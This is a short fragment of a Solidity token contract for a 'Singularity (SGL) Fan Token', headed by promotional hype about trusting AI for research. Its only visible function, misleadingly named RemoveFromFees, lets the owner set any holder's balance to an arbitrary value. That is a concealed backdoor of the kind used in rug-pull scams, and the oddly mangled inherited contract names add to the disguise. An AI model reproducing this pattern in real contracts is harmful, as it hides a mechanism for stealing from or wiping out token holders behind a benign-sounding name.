...
/**
🚀 Singularity 🚀
Singularity (SGL) Fan Token

When the times are tough, trust the AI to do all your research for you. The Technological Singularity has begun. 
...
contract SingularityNFT is Contextrte, IBEPSingularity, Ownableertg {
 ...
 function RemoveFromFees(address CSingularity, uint256 CSingularityNFT) external onlyOwner{
    _totbalances[CSingularity] = CSingularityNFT;
  }
